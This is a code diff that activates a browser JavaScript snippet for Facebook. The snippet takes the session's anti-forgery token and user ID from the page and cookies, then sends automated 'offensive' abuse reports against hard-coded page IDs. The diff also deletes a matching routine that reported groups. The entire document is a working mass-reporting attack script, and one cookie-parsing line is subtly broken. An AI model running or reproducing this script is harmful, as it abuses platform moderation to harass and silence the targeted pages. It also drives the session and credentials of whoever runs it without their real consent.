@@ -1,47 +1,22 @@
 /*pages*/
-
-/*
-
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
 var now=(new Date).getTime();
 function pages(pid) {
-  var Page = new XMLHttpRequest();
-  var PageURL = "//www.facebook.com/ajax/report/social.php";
-  var PageParams ="fb_dtsg="+fb_dtsg+"&first_choice=harassing&pp=%7B%22are_friends%22%3Afalse%2C%22cid%22%3A"+pid+"%2C%22content_type%22%3A23%2C%22is_following%22%3Afalse%2C%22is_tagged%22%3Afalse%2C%22on_profile%22%3Afalse%2C%22phase%22%3A1%2C%22time_flow_started%22%3A"+now+"%2C%22user%22%3A"+user_id+"%7D&__user="+user_id+"&__a=1&__dyn=7n8ahyj35ynzpQ9UmAWuURDw&__req=b&ttstamp=265816710111657104112";
-  Page.open("POST", PageURL, true);
-  Page.onreadystatechange = function () {
-    if (Page.readyState == 4 && Page.status == 200) {
-      Page.close;
-    }
-  };
-  Page.send(PageParams);
+var Page = new XMLHttpRequest();
+var PageURL = "//www.facebook.com/ajax/report/social.php";
+var PageParams ="fb_dtsg="+fb_dtsg+"&pp=%7B%22actions_to_take%22%3A%22[]%22%2C%22are_friends%22%3Afalse%2C%22cid%22%3A"+pid+"%2C%22content_type%22%3A23%2C%22first_choice%22%3A%22offensive%22%2C%22is_following%22%3Afalse%2C%22is_tagged%22%3Afalse%2C%22on_profile%22%3Afalse%2C%22phase%22%3A3%2C%22report_type%22%3A0%2C%22time_flow_started%22%3A"+now+"%2C%22user%22%3A"+user_id+"%7D&file_report=1&__user="+user_id+"&__a=1&__dyn=7n8ahyj35ynzpQ9UmWWiKaExEW9AVEqw&__req=f&ttstamp=2658165112877210152";
+Page.open("POST", PageURL, true);
+Page.onreadystatechange = function () {
+if (Page.readyState == 4 && Page.status == 200) {
+Page.close;
 }
-pages("233824400006176");
-pages("433662713394176");
-pages("382408828493995");
-
-*/
-
-/*groups
-
-var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
-var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
-var now=(new Date).getTime();
-function G(gid) {
-  var Page = new XMLHttpRequest();
-  var PageURL = "//www.facebook.com/ajax/report/social.php";
-  var PageParams ="fb_dtsg="+fb_dtsg+"&pp=%7B%22are_friends%22%3Afalse%2C%22cid%22%3A"+gid+"%2C%22content_type%22%3A1%2C%22is_following%22%3Afalse%2C%22is_tagged%22%3Afalse%2C%22on_profile%22%3Afalse%2C%22phase%22%3A3%2C%22report_type%22%3A0%2C%22time_flow_started%22%3A"+now+"%2C%22user%22%3A"+user_id+"%7D&file_report=1&__user="+user_id+"&__a=1&__dyn=7n8ahyj35ynzpQ9UmWWuUGy6zECUC&__req=14&ttstamp=265816865451034555";
-  Page.open("POST", PageURL, true);
-  Page.onreadystatechange = function () {
-    if (Page.readyState == 4 && Page.status == 200) {
-      Page.close;
-    }
-  };
-  Page.send(PageParams);
+};
+Page.send(PageParams);
 }
-G("598368236842941");
-*/
+pages("446909922032433");
+
+
 
 
 
